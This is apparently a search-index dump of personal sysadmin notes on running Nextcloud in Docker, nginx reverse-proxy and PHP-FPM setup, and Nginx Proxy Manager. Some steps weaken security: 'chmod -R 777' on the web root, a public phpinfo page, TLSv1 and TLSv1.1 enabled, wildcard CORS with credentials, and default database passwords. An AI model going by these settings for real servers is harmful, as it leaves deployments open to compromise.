<code>REDIS_HOST_PASSWORD</code>, <code>SMTP_PASSWORD</code>, <code>OBJECTSTORE_S3_KEY</code>, and <code>OBJECTSTORE_S3_SECRET</code>.</p> <p>If you set any group of values (i.e. all of <code>MYSQL_DATABASE_FILE</code>, <code>MYSQL_USER_FILE</code>, <code>MYSQL_PASSWORD_FILE</code>, <code>MYSQL_HOST</code>), the script will not use the corresponding group of environment variables (<code>MYSQL_DATABASE</code>, <code>MYSQL_USER</code>, <code>MYSQL_PASSWORD</code>, <code>MYSQL_HOST</code>).</p>"},{"location":"Nextcloud/NextCloud/#make-your-nextcloud-available-from-the-internet","title":"Make your Nextcloud available from the internet","text":"<p>Until here, your Nextcloud is just available from your docker host. If you want your Nextcloud available from the internet adding SSL encryption is mandatory.</p>"},{"location":"Nextcloud/NextCloud/#https-ssl-encryption","title":"HTTPS - SSL encryption","text":"<p>There are many different possibilities to introduce encryption depending on your setup.</p> <p>We recommend using a reverse proxy in front of your Nextcloud installation. Your Nextcloud will only be reachable through the proxy, which encrypts all traffic to the clients. You can mount your manually generated certificates to the proxy or use a fully automated solution which generates and renews the certificates for you.</p> <p>In our examples section we have an example for a fully automated setup using a reverse proxy, a container for Let's Encrypt certificate handling, database and Nextcloud. It uses the popular nginx-proxy and docker-letsencrypt-nginx-proxy-companion containers. Please check the according documentations before using this setup.</p>"},{"location":"Nextcloud/NextCloud/#first-use","title":"First use","text":"<p>When you first access your Nextcloud, the setup wizard will appear and ask you to choose an administrator account username, password and the database connection. For the database use <code>db</code> as host and <code>nextcloud</code> as table and user name. Also enter the password you chose in your <code>docker-compose.yml</code> file.</p>"},{"location":"Nextcloud/NextCloud/#update-to-a-newer-version","title":"Update to a newer version","text":"<p>Updating the Nextcloud container is done by pulling the new image, throwing away the old container and starting the new one.</p> <p>It is only possible to upgrade one major version at a time. For example, if you want to upgrade from version 14 to 16, you will have to upgrade from version 14 to 15, then from 15 to 16.</p> <p>Since all data is stored in volumes, nothing gets lost. The startup script will check for the version in your volume and the installed docker version. If it finds a mismatch, it automatically starts the upgrade process. Don't forget to add all the volumes to your new container, so it works as expected.</p> <pre><code>$ docker pull nextcloud\n$ docker stop &lt;your_nextcloud_container&gt;\n$ docker rm &lt;your_nextcloud_container&gt;\n$ docker run &lt;OPTIONS&gt; -d nextcloud\n</code></pre> <p>Beware that you have to run the same command with the options that you used to initially start your Nextcloud. That includes  volumes, port mapping.</p> <p>When using docker-compose your compose file takes care of your configuration, so you just have to run:</p> <pre><code>$ docker-compose pull\n$ docker-compose up -d\n</code></pre>"},{"location":"Nextcloud/NextCloud/#adding-features","title":"Adding Features","text":"<p>A lot of people want to use additional functionality inside their Nextcloud installation. If the image does not include the packages you need, you can easily build your own image on top of it. Start your derived image with the <code>FROM</code> statement and add whatever you like.</p> <pre><code>FROM nextcloud:apache\n\nRUN ...\n</code></pre> <p>The examples folder gives a few examples on how to add certain functionalities, like including the cron job, smb-support or imap-authentication.</p> <p>If you use your own Dockerfile, you need to configure your docker-compose file accordingly. Switch out the <code>image</code> option with <code>build</code>. You have to specify the path to your Dockerfile. (in the example it's in the same directory next to the docker-compose file)</p> <pre><code>  app:\n    build: .\n    restart: always\n    links:\n      - db\n    volumes:\n      - data:/var/www/html/data\n      - config:/var/www/html/config\n      - apps:/var/www/html/apps\n</code></pre> <p>If you intend to use another command to run the image, make sure that you set <code>NEXTCLOUD_UPDATE=1</code> in your Dockerfile. Otherwise the installation and update will not work.</p> <pre><code>FROM nextcloud:apache\n\n...\n\nENV NEXTCLOUD_UPDATE=1\n\nCMD [\"/usr/bin/supervisord\"]\n</code></pre> <p>Updating your own derived image is also very simple. When a new version of the Nextcloud image is available run:</p> <pre><code>docker build -t your-name --pull .\ndocker run -d your-name\n</code></pre> <p>or for docker-compose:</p> <pre><code>docker-compose build --pull\ndocker-compose up -d\n</code></pre> <p>The <code>--pull</code> option tells docker to look for new versions of the base image. Then the build instructions inside your <code>Dockerfile</code> are run on top of the new image.</p>"},{"location":"Nextcloud/NextCloud/#migrating-an-existing-installation","title":"Migrating an existing installation","text":"<p>You're already using Nextcloud and want to switch to docker? Great! Here are some things to look out for:</p> <ol> <li>Define your whole Nextcloud infrastructure in a <code>docker-compose</code> file and run it with <code>docker-compose up -d</code> to get the base installation, volumes and database. Work from there.</li> <li>Restore your database from a mysqldump (nextcloud_db_1 is the name of your db container)<ul> <li>To import from a MySQL dump use the following commands <code>console docker cp ./database.dmp nextcloud_db_1:/dmp docker-compose exec db sh -c \"mysql --user USER --password PASSWORD nextcloud &lt; /dmp\" docker-compose exec db rm /dmp</code></li> <li>To import from a PostgreSQL dump use to following commands <code>console docker cp ./database.dmp nextcloud_db_1:/dmp docker-compose exec db sh -c \"psql -U USER --set ON_ERROR_STOP=on nextcloud &lt; /dmp\" docker-compose exec db rm /dmp</code></li> </ul> </li> <li>Edit your config.php<ol> <li>Set database connection<ul> <li>In case of MySQL database <code>php 'dbhost' =&gt; 'db:3306',</code></li> <li>In case of PostgreSQL database <code>php 'dbhost' =&gt; 'db:5432',</code></li> </ul> </li> <li>Make sure you have no configuration for the <code>apps_paths</code>. Delete lines like these     <code>php     'apps_paths' =&gt; array (         0 =&gt; array (             'path' =&gt; OC::$SERVERROOT.'/apps',             'url' =&gt; '/apps',             'writable' =&gt; true,         ),     ),</code></li> <li>Make sure to have the <code>apps</code> directory non writable and the <code>custom_apps</code> directory writable     <code>php     'apps_paths' =&gt; array (       0 =&gt; array (         'path' =&gt; '/var/www/html/apps',         'url' =&gt; '/apps',         'writable' =&gt; false,       ),       1 =&gt; array (         'path' =&gt; '/var/www/html/custom_apps',         'url' =&gt; '/custom_apps',         'writable' =&gt; true,       ),     ),</code></li> <li>Make sure your data directory is set to /var/www/html/data     <code>php     'datadirectory' =&gt; '/var/www/html/data',</code></li> </ol> </li> <li>Copy your data (nextcloud_app_1 is the name of your Nextcloud container):     <code>console     docker cp ./data/ nextcloud_app_1:/var/www/html/     docker-compose exec app chown -R www-data:www-data /var/www/html/data     docker cp ./theming/ nextcloud_app_1:/var/www/html/     docker-compose exec app chown -R www-data:www-data /var/www/html/theming     docker cp ./config/config.php nextcloud_app_1:/var/www/html/config     docker-compose exec app chown -R www-data:www-data /var/www/html/config</code>     If you want to preserve the metadata of your files like timestamps, copy the data directly on the host to the named volume using plain <code>cp</code> like this:     <code>console     cp --preserve --recursive ./data/ /path/to/nextcloudVolume/data</code></li> <li>Copy only the custom apps you use (or simply redownload them from the web interface):     <code>console     docker cp ./custom_apps/ nextcloud_data:/var/www/html/     docker-compose exec app chown -R www-data:www-data /var/www/html/custom_apps</code></li> </ol>"},{"location":"Nextcloud/NextCloud/#questions-issues","title":"Questions / Issues","text":"<p>If you got any questions or problems using the image, please visit our Github Repository and write an issue.</p>"},{"location":"Nginx/localhostConf/","title":"Nginx Conf","text":"<p>nginx.conf</p> <pre><code># auto detects a good number of processes to run\nworker_processes auto;\n\n#Provides the configuration file context in which the directives that affect connection processing are specified.\nevents {\n    # Sets the maximum number of simultaneous connections that can be opened by a worker process.\n    worker_connections 8000;\n    # Tells the worker to accept multiple connections at a time\n    multi_accept on;\n}\n\nhttp {\n    # what times to include\n    include /etc/nginx/mime.types;\n    # what is the default one\n    default_type application/octet-stream;\n\n    # Sets the path, format, and configuration for a buffered log write\n    log_format compression '$remote_addr - $remote_user [$time_local] '\n    '\"$request\" $status $upstream_addr '\n    '\"$http_referer\" \"$http_user_agent\"';\n\n    server {\n        # listen on port 8080\n        listen 80;\n        listen [::]:80;\n        listen 4200;\n        listen [::]:4200;\n        listen 3000;\n        listen [::]:3000;\n\n        # TIME OUTS\n        proxy_connect_timeout 600; \n        proxy_send_timeout 1800; \n        proxy_read_timeout 1800; \n        send_timeout 1800;\n\n        # save logs here\n        access_log /var/log/nginx/access.log compression;\n\n        # GZIP\n        gzip on;\n        gzip_http_version 1.0;\n        gzip_comp_level 5; # 1-9\n        gzip_min_length 256;\n        gzip_proxied any;\n        gzip_vary on;\n\n        # MIME-types\n        gzip_types\n        application/atom+xml\n        application/javascript\n        application/json\n        application/rss+xml\n        application/vnd.ms-fontobject\n        application/x-font-ttf\n        application/x-web-app-manifest+json\n        application/xhtml+xml\n        application/xml\n        font/opentype\n        image/svg+xml\n        image/x-icon\n        text/css\n        text/plain\n        text/x-component;\n\n        # where the root here\n        root /usr/share/nginx/html;\n        # what file to server as index\n        index index.html index.htm;\n\n        location / {\n            # First attempt to serve request as file, then\n            # as directory, then fall back to redirecting to index.html\n            try_files $uri $uri/ /index.html;\n            include /etc/nginx/mime.types;\n            root /usr/share/nginx/html;\n        }\n        location /api {\n                proxy_pass http://back:3000;\n                if ($request_method = OPTIONS) {\n                return 204;\n                }\n\n                add_header Access-Control-Allow-Origin *;\n                add_header Access-Control-Max-Age 3600;\n                add_header Access-Control-Expose-Headers Content-Length;\n                add_header Access-Control-Allow-Headers Range;\n\n        }\n\n\n        location /swagger {\n                proxy_pass http://back:3000;\n        }\n\n        location = /robots.txt {\n                add_header Content-Type text/plain;\n                return 200 \"User-agent: *\\nDisallow: /\\n\";\n        }\n\n        # Media: images, icons, video, audio, HTC\n        location ~* \\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|htc)$ {\n            expires 1M;\n            access_log off;\n            add_header Cache-Control \"public\";\n        }\n\n        # Javascript and CSS files\n        location ~* \\.(?:css|js)$ {\n            try_files $uri =404;\n            expires 1y;\n            access_log off;\n            add_header Cache-Control \"public\";\n        }\n\n        # Any route containing a file extension (e.g. /devicesfile.js)\n        location ~ ^.+\\..+$ {\n            try_files $uri =404;\n        }\n    }\n}\n</code></pre>"},{"location":"Nginx/nginx_php/","title":"Nginx php","text":""},{"location":"Nginx/nginx_php/#why-is-nginx-php-and-fastcgi-so-popular","title":"Why is Nginx, PHP and fastCGI so popular?","text":"<p>Nginx is the DevOps community\u2019s most beloved http web server. And developers love the PHP programming language because it enables them to quickly build and deploy interactive websites.</p> <p>As such, it\u2019s no wonder that so many sys admins need to configure Nginx, PHP and PHP-FPM on both Linux and Windows servers.</p> <p>This quick tutorial shows you how to setup PHP and Nginx on Ubuntu Linux with the fastCGI process manager (PHP-FPM) configured as Nginx\u2019s PHP engine.</p>"},{"location":"Nginx/nginx_php/#how-to-setup-nginx-php-and-php-fpm","title":"How to setup Nginx, PHP and PHP-FPM","text":"<p>To setup and configure fastCGI (FPM), PHP, and Nginx on Ubuntu Linux, follow these steps:</p> <ol> <li>Perform an apt-get update to ensure access to the latest packages.</li> <li>Install Nginx on Ubuntu.</li> <li>Install the php-fpm for Nginx package.</li> <li>Edit the server\u2019s default config file to support PHP in Nginx.</li> <li>Restart the PHP configured Nginx server.</li> <li>Add a PHP file to Nginx\u2019s html directory.</li> <li>Test the PHP, Nginx and PHP-FPM configuration.</li> </ol>"},{"location":"Nginx/nginx_php/#download-the-latest-nginx-and-php-packages","title":"Download the latest Nginx and PHP packages","text":"<p>Every software install in Ubuntu should start with a quick <code>apt-get update</code> and possibly an <code>apt-get upgrade</code> command.</p> <pre><code>sudo apt-get update -y\nReading package lists... Done\nsudo apt-get upgrade -y\nCalculating upgrade... Done\n</code></pre>"},{"location":"Nginx/nginx_php/#install-nginx-on-ubuntu","title":"Install Nginx on Ubuntu","text":"<p>To install PHP on Nginx, you must first install Nginx, which you can achieve through a simple <code>apt-get install</code> command:</p> <pre><code>sudo apt-get install nginx -y\nThe following Nginx packages will be installed:\nlibnginx-mod-http-geoip2 nginx-common nginx-core\nSetting up nginx 1.18.0-6 ubuntu... Done\n</code></pre>"},{"location":"Nginx/nginx_php/#verify-the-running-nginx-server","title":"Verify the running Nginx server","text":"<p>To verify the successful installation and configuration of Nginx on Ubuntu, query the HTTP server\u2019s status:</p> <pre><code>sudo systemctl status nginx\n\u25cf nginx.service - A high performance web server and a reverse proxy server\n   Loaded: loaded (/lib/systemd/system/nginx.service; enabled;)\n   Active: active (Nginx running)\n</code></pre> <p>You can visually verify the Nginx landing page displays on http://localhost:80 of a web browser.</p>"},{"location":"Nginx/nginx_php/#install-php-for-nginx-with-php-fpm","title":"Install PHP for Nginx with PHP-FPM","text":"<p>To install PHP for Nginx, use the PHP-FPM library. You can install PHP-FPM support with another <code>apt-get install</code> command:</p> <pre><code>sudo apt-get install php8.1-fpm -y\n</code></pre> <p>In this instance, we have installed version 8.1 of the PHP and PHP-FPM packages.</p> <p>A common mistake is to install the PHP, not PHP-FPM package. The problem with this approach is that unlike PHP-FPM, the PHP package installs the Apache HTTP server and its httpd process, which conflicts with Nginx.</p>"},{"location":"Nginx/nginx_php/#why-does-a-basic-php-install-require-apache","title":"Why does a basic PHP install require Apache?","text":"<p>PHP requires one of three dependencies to exist on a machine:</p> <ul> <li>libapache2-mod-php</li> <li>php-fpm</li> <li>php-cgi</li> </ul> <p>A simple PHP install uses the libapache2-mod-php module by default, which requires installation of the full Apache HTTP server software suite. To avoid this, install either the php-cgi or the php-fpm module for Nginx.</p>"},{"location":"Nginx/nginx_php/#check-if-php-fpm-is-running","title":"Check if PHP-FPM is running","text":"<p>After the PHP-FPM setup is complete, check to see if it is running:</p> <pre><code>sudo systemctl status php8.1-fpm\n\u25cf php8.1-fpm.service - PHP 8.1 FastCGI Process Manager FPM for Ubuntu\n  Loaded: loaded (/lib/systemd/system/php8.1-fpm.service)\n  Active: active (php-fpm running)\n</code></pre>"},{"location":"Nginx/nginx_php/#add-php-support-to-nginx","title":"Add PHP support to Nginx","text":"<p>With Nginx and PHP-FPM installed, you must edit the default Nginx config file. This allow the PHP FastCGI Process Manager to handle requests that have a .php extension.</p> <p>The default Nginx file can be opened with any text editor. This command will open it with Nano:</p> <pre><code>sudo nano /etc/nginx/sites-available/default\n</code></pre> <p>Make the following changes to the Nginx config to support PHP and PHP-FPM on the server:</p> <ul> <li>Add index.php to the index list.</li> <li>Uncomment the PHP scripts to FastCGI entry block.</li> <li>Uncomment the line to include snippets/fastcgi-php.conf.</li> <li>Uncomment the line to enable the fastcgi_pass and the php8.1-fpm. sock.</li> <li>Uncomment the section to deny all access to Apache .htaccess files.</li> </ul> <p></p> <p>To configure PHP, Nginx and FTP (fastCGI), you must update the Nginx config file.</p>"},{"location":"Nginx/nginx_php/#enable-php-in-nginxs-config-file","title":"Enable PHP in Nginx\u2019s config file","text":"<p>The server section of the Nginx, PHP and PHP-FPM config file will look like this when completed. Changes are highlighted in bold:</p> <pre><code>server {\n  # Example PHP Nginx FPM config file\n  listen 80 default_server;\n  listen [::]:80 default_server;\n  root /var/www/html;\n\n  # Add index.php to setup Nginx, PHP &amp; PHP-FPM config\n  index index.php index.html index.htm index.nginx-debian.html;\n\n  server_name _;\n\n  location / {\n    try_files $uri $uri/ =404;\n  }\n\n  # pass PHP scripts on Nginx to FastCGI (PHP-FPM) server\n  location ~ \\.php$ {\n    include snippets/fastcgi-php.conf;\n\n    # Nginx php-fpm sock config:\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n    # Nginx php-cgi config :\n    # Nginx PHP fastcgi_pass 127.0.0.1:9000;\n  }\n\n  # deny access to Apache .htaccess on Nginx with PHP, \n  # if Apache and Nginx document roots concur\n  location ~ /\\.ht {\n    deny all;\n  }\n} # End of PHP FPM Nginx config example\n</code></pre>"},{"location":"Nginx/nginx_php/#how-to-validate-an-nginx-config-file","title":"How to validate an Nginx config file","text":"<p>The following command validates the updated Nginx config file to ensure the edits do not create any syntax errors:</p> <pre><code>sudo nginx -t\nnginx php config: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx php-fpm config: configuration file /etc/nginx/nginx.conf test is successful\n</code></pre> <p>To enable the Nginx PHP fastCGI setup, restart the server:</p> <pre><code>sudo systemctl restart nginx\n</code></pre>"},{"location":"Nginx/nginx_php/#create-a-php-page-in-nginx","title":"Create a PHP page in Nginx","text":"<p>After the restart, PHP is fully enabled on Nginx. To prove this, create a PHP file in Nginx\u2019s /var/www/html folder and test to ensure the page renders properly on the server.</p> <p>You may have to change permissions to the folder with a <code>CHMOD</code> command in order to create a file in it:</p> <pre><code>sudo chmod -R 777 /var/www/html\n</code></pre> <p>Then add a new PHP file to Nginx\u2019s web hosting directory. The easiest way to do so is with a quick <code>echo</code> command:</p> <pre><code>echo \"&lt;?php phpinfo(); ?&gt;\" &gt;&gt; /var/www/html/info.php\n</code></pre> <p>This creates the most basic PHP file outside of a \u201cHello World\u201d example you could create. If you dislike the <code>echo</code> command, use an editor to create a file named info.php in the /var/www/html folder with the following content:</p> <pre><code>&lt;?php\n  phpinfo();\n?&gt;\n</code></pre>"},{"location":"Nginx/nginx_php/#test-the-nginx-php-integration","title":"Test the Nginx, PHP integration","text":"<p>With the configuration of Nginx, PHP and the PHP-FPM module complete, and a new file named info.php added to the web server, simply open a browser to http://localhost/info.php to test the setup. The PHP info page, attesting to the fact that the install on Nginx of PHP 8.1, will appear.</p> <p></p> <p>When PHP, FPM and Nginx are fully configured, the server will be able to render PHP pages.</p>"},{"location":"Nginx/nginx_php/#commands-to-setup-php-and-nginx-in-ubuntu","title":"Commands to setup PHP and Nginx in Ubuntu","text":"<p>Let\u2019s quickly review this PHP and Nginx tutorial. These are all of the commands that we used to enable the fastCGI process manager for PHP in Nginx:</p> <ul> <li> <p><code>sudo apt-get update -y</code></p> </li> <li> <p><code>sudo apt-get upgrade -y</code></p> </li> <li> <p><code>sudo apt-get install nginx -y</code></p> </li> <li> <p><code>sudo systemctl status nginx</code></p> </li> <li> <p><code>sudo apt-get install php8.1-fpm -y</code></p> </li> <li> <p><code>sudo systemctl status php8.1-fpm</code></p> </li> <li> <p><code>sudo nano /etc/nginx/sites-available/default</code></p> </li> <li> <p><code>sudo nginx -t</code></p> </li> <li> <p><code>sudo systemctl restart nginx</code></p> </li> <li> <p><code>sudo chmod -R 777 /var/www/html</code></p> </li> <li> <p><code>echo \"&lt;?php phpinfo(); ?&gt;\" &gt;&gt; /var/www/html/info.php</code></p> </li> </ul>"},{"location":"Nginx/reverseProxy/","title":"reverseProxy","text":"<pre><code>server {\nlisten 443 ssl;\n\nserver_name preprod.myluna.tk;\n# Edit the above _YOUR-DOMAIN_ to your domain name\n\nssl_certificate /etc/letsencrypt/live/preprod..myluna.tk/fullchain.pem;\n# If you use Lets Encrypt, you should just need to change the domain.\n# Otherwise, change this to the path to full path to your domains public certificate file.\n\nssl_certificate_key /etc/letsencrypt/live/preprod.myluna.tk/privkey.pem;\n# If you use Let's Encrypt, you should just need to change the domain.\n# Otherwise, change this to the direct path to your domains private key certificate file.\n\nssl_session_cache builtin:1000 shared:SSL:10m;\n# Defining option to share SSL Connection with Passed Proxy\n\nssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n# Defining used protocol versions.\n\nssl_ciphers HIGH:!aNULL:!eNULL:!EXPORT:!CAMELLIA:!DES:!MD5:!PSK:!RC4;\n# Defining ciphers to use.\n\nssl_prefer_server_ciphers on;\n# Enabling ciphers\n\naccess_log /var/log/nginx/access.log;\n# Log Location. the Nginx User must have R/W permissions. Usually by ownership.\n\nlocation / {\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\nproxy_set_header X-Forwarded-Proto $scheme;\nproxy_pass http://localhost:3000;\n#proxy_pass unix:/path/to/php7.3.sock # This is an example of how to define a unix socket.\nproxy_read_timeout 90;\n}\n\n}\n</code></pre>"},{"location":"Nginx/serverConf/","title":"serverConf","text":"<pre><code>server {\n        add_header 'Access-Control-Allow-Origin' '*' always;\n        add_header 'Access-Control-Allow-Credentials' 'true';\n        add_header 'Access-Control-Allow-Headers' 'Content-Type,Accept';\n        add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS, PUT, DELETE';\n        #root /home/gitlab-runner/OLD/bts_internship_2019_fe_app/dist/bts-admin;\n        root /home/gitlab-runner/UAT/nginx/;\n        index index.html index.htm index.nginx-debian.html;\n        server_name mybts-uat.bluetrail.software;\n\n        location / {\n                try_files $uri $uri/ /index.html;\n        }\n\n        location /api {\n                proxy_pass http://localhost:3002;\n        }\n\n        location /swagger {\n                proxy_pass http://localhost:3002;\n        }\n\n        location = /robots.txt {\n                add_header Content-Type text/plain;\n                return 200 \"User-agent: *\\nDisallow: /\\n\";\n        }\n\n        location /legacy {\n                proxy_pass http://mybts-legacy.bluetrail.software;\n        }\n\n\n\n\n        listen 443 ssl;\n        listen [::]:443 ssl;\n        ssl_certificate_key /etc/letsencrypt/live/mybts-uat.bluetrail.software/privkey.pem;\n        ssl_certificate /etc/letsencrypt/live/mybts-uat.bluetrail.software/fullchain.pem;\n        # managed by Certbot\n}\n\nserver {\n    if ($host = mybts-uat.bluetrail.software) {\n        return 301 https://$host$request_uri;\n    } # managed by Certbot\n\n\n        listen 80;\n        listen [::]:80;\n        server_name mybts-uat.bluetrail.software;\n    return 404; # managed by Certbot\n\n\n}\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/","title":"AdvancedSettings","text":""},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#best-practice-use-a-docker-network","title":"Best Practice: Use a Docker network","text":"<p>For those who have a few of their upstream services running in Docker on the same Docker host as NPM, here's a trick to secure things a bit better. By creating a custom Docker network, you don't need to publish ports for your upstream services to all of the Docker host's interfaces.</p> <p>Create a network, ie \"scoobydoo\":</p> <pre><code>docker network create scoobydoo\n</code></pre> <p>Then add the following to the <code>docker-compose.yml</code> file for both NPM and any other services running on this Docker host:</p> <pre><code>networks:\n  default:\n    external: true\n    name: scoobydoo\n</code></pre> <p>Let's look at a Portainer example:</p> <pre><code>version: '3.8'\nservices:\n\n  portainer:\n    image: portainer/portainer\n    privileged: true\n    volumes:\n      - './data:/data'\n      - '/var/run/docker.sock:/var/run/docker.sock'\n    restart: unless-stopped\n\nnetworks:\n  default:\n    external: true\n    name: scoobydoo\n</code></pre> <p>Now in the NPM UI you can create a proxy host with <code>portainer</code> as the hostname, and port <code>9000</code> as the port. Even though this port isn't listed in the docker-compose file, it's \"exposed\" by the Portainer Docker image for you and not available on the Docker host outside of this Docker network. The service name is used as the hostname, so make sure your service names are unique when using the same network.</p>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#docker-healthcheck","title":"#Docker Healthcheck","text":"<p>The <code>Dockerfile</code> that builds this project does not include a <code>HEALTHCHECK</code> but you can opt in to this feature by adding the following to the service in your <code>docker-compose.yml</code> file:</p> <pre><code>healthcheck:\n  test: [\"CMD\", \"/bin/check-health\"]\n  interval: 10s\n  timeout: 3s\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#docker-file-secrets","title":"#Docker File Secrets","text":"<p>This image supports the use of Docker secrets to import from files and keep sensitive usernames or passwords from being passed or preserved in plaintext.</p> <p>You can set any environment variable from a file by appending <code>__FILE</code> (double-underscore FILE) to the environmental variable name.</p> <pre><code>version: '3.8'\n\nsecrets:\n  # Secrets are single-line text files where the sole content is the secret\n  # Paths in this example assume that secrets are kept in local folder called \".secrets\"\n  DB_ROOT_PWD:\n    file: .secrets/db_root_pwd.txt\n  MYSQL_PWD:\n    file: .secrets/mysql_pwd.txt\n\nservices:\n  app:\n    image: 'jc21/nginx-proxy-manager:latest'\n    restart: unless-stopped\n    ports:\n      # Public HTTP Port:\n      - '80:80'\n      # Public HTTPS Port:\n      - '443:443'\n      # Admin Web Port:\n      - '81:81'\n    environment:\n      # These are the settings to access your db\n      DB_MYSQL_HOST: \"db\"\n      DB_MYSQL_PORT: 3306\n      DB_MYSQL_USER: \"npm\"\n      # DB_MYSQL_PASSWORD: \"npm\"  # use secret instead\n      DB_MYSQL_PASSWORD__FILE: /run/secrets/MYSQL_PWD\n      DB_MYSQL_NAME: \"npm\"\n      # If you would rather use Sqlite, remove all DB_MYSQL_* lines above\n      # Uncomment this if IPv6 is not enabled on your host\n      # DISABLE_IPV6: 'true'\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    secrets:\n      - MYSQL_PWD\n    depends_on:\n      - db\n\n  db:\n    image: jc21/mariadb-aria\n    restart: unless-stopped\n    environment:\n      # MYSQL_ROOT_PASSWORD: \"npm\"  # use secret instead\n      MYSQL_ROOT_PASSWORD__FILE: /run/secrets/DB_ROOT_PWD\n      MYSQL_DATABASE: \"npm\"\n      MYSQL_USER: \"npm\"\n      # MYSQL_PASSWORD: \"npm\"  # use secret instead\n      MYSQL_PASSWORD__FILE: /run/secrets/MYSQL_PWD\n    volumes:\n      - ./data/mysql:/var/lib/mysql\n    secrets:\n      - DB_ROOT_PWD\n      - MYSQL_PWD\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#disabling-ipv6","title":"#Disabling IPv6","text":"<p>On some Docker hosts IPv6 may not be enabled. In these cases, the following message may be seen in the log:</p> <p>Address family not supported by protocol</p> <p>The easy fix is to add a Docker environment variable to the Nginx Proxy Manager stack:</p> <pre><code>    environment:\n      DISABLE_IPV6: 'true'\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#custom-nginx-configurations","title":"#Custom Nginx Configurations","text":"<p>If you are a more advanced user, you might be itching for extra Nginx customizability.</p> <p>NPM has the ability to include different custom configuration snippets in different places.</p> <p>You can add your custom configuration snippet files at <code>/data/nginx/custom</code> as follow:</p> <ul> <li><code>/data/nginx/custom/root.conf</code>: Included at the very end of nginx.conf</li> <li><code>/data/nginx/custom/http_top.conf</code>: Included at the top of the main http block</li> <li><code>/data/nginx/custom/http.conf</code>: Included at the end of the main http block</li> <li><code>/data/nginx/custom/events.conf</code>: Included at the end of the events block</li> <li><code>/data/nginx/custom/stream.conf</code>: Included at the end of the main stream block</li> <li><code>/data/nginx/custom/server_proxy.conf</code>: Included at the end of every proxy server block</li> <li><code>/data/nginx/custom/server_redirect.conf</code>: Included at the end of every redirection server block</li> <li><code>/data/nginx/custom/server_stream.conf</code>: Included at the end of every stream server block</li> <li><code>/data/nginx/custom/server_stream_tcp.conf</code>: Included at the end of every TCP stream server block</li> <li><code>/data/nginx/custom/server_stream_udp.conf</code>: Included at the end of every UDP stream server block</li> </ul> <p>Every file is optional.</p>"},{"location":"Nginx%20Proxy%20Manager/AdvancedSettings/#x-frame-options-header","title":"#X-FRAME-OPTIONS Header","text":"<p>You can configure the <code>X-FRAME-OPTIONS</code> header value by specifying it as a Docker environment variable. The default if not specified is <code>deny</code>.</p> <pre><code>  ...\n  environment:\n    X_FRAME_OPTIONS: \"sameorigin\"\n  ...\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/","title":"Full Setup Instructions","text":""},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/#running-the-app","title":"#Running the App","text":"<p>Create a <code>docker-compose.yml</code> file:</p> <pre><code>replace image for\njc21/nginx-proxy-manager:2.9.22\nif you have an issue with ports\n</code></pre> <pre><code>docker run -d --network=host -v ~/npm/data:/data -v ~/npm/letsencrypt:/etc/letsencrypt --restart=unless-stopped jc21/nginx-proxy-manager:latest\n</code></pre> <pre><code>version: '3.8'\nservices:\n  app:\n    image: 'jc21/nginx-proxy-manager:latest'\n    restart: unless-stopped\n    ports:\n      # These ports are in format &lt;host-port&gt;:&lt;container-port&gt;\n      - '80:80' # Public HTTP Port\n      - '443:443' # Public HTTPS Port\n      - '81:81' # Admin Web Port\n      # Add any other Stream port you want to expose\n      # - '21:21' # FTP\n\n    # Uncomment the next line if you uncomment anything in the section\n    # environment:\n      # Uncomment this if you want to change the location of\n      # the SQLite DB file within the container\n      # DB_SQLITE_FILE: \"/data/database.sqlite\"\n\n      # Uncomment this if IPv6 is not enabled on your host\n      # DISABLE_IPV6: 'true'\n\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n</code></pre> <p>Then:</p> <pre><code>docker-compose up -d\n</code></pre>"},{"location":"Nginx%20Proxy%20Manager/NginxPMdoc/#using-mysql-mariadb-database","title":"#Using MySQL / MariaDB Database","text":"<p>If you opt for the MySQL configuration you will have to provide the database server yourself. You can also use MariaDB. Here are the minimum supported versions:</p> <ul> <li>MySQL v5.7.8+</li> <li>MariaDB v10.2.7+</li> </ul> <p>It's easy to use another docker container for your database also and link it as part of the docker stack, so that's what the following examples are going to use.</p> <p>Here is an example of what your <code>docker-compose.yml</code> will look like when using a MariaDB container:</p> <pre><code>version: '3.8'\nservices:\n  app:\n    image: 'jc21/nginx-proxy-manager:latest'\n    restart: unless-stopped\n    ports:\n      # These ports are in format &lt;host-port&gt;:&lt;container-port&gt;\n      - '80:80' # Public HTTP Port\n      - '443:443' # Public HTTPS Port\n      - '81:81' # Admin Web Port\n      # Add any other Stream port you want to expose\n      # - '21:21' # FTP\n    environment:\n      # Unix user and group IDs, optional\n      PUID: 1000\n      PGID: 1000\n      # Mysql/Maria connection parameters:\n      DB_MYSQL_HOST: \"db\"\n      DB_MYSQL_PORT: 3306\n      DB_MYSQL_USER: \"npm\"\n      DB_MYSQL_PASSWORD: \"npm\"\n      DB_MYSQL_NAME: \"npm\"\n      # Uncomment this if IPv6 is not enabled on your host\n      # DISABLE_IPV6: 'true'\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    depends_on:\n      - db\n\n  db:\n    image: 'jc21/mariadb-aria:latest'\n    restart: unless-stopped\n    environment:\n      MYSQL_ROOT_PASSWORD: 'npm'\n      MYSQL_DATABASE: 'npm'\n      MYSQL_USER: 'npm'\n      MYSQL_PASSWORD: 'npm'\n    volumes:\n      - ./data/mysql:/var/lib/mysql\n</code></pre> <p>WARNING</p> <p>Please note, that <code>DB_MYSQL_*</code> environment variables will take precedent over <code>DB_SQLITE_*</code> variables. So if you keep the MySQL variables, you will not be able to use 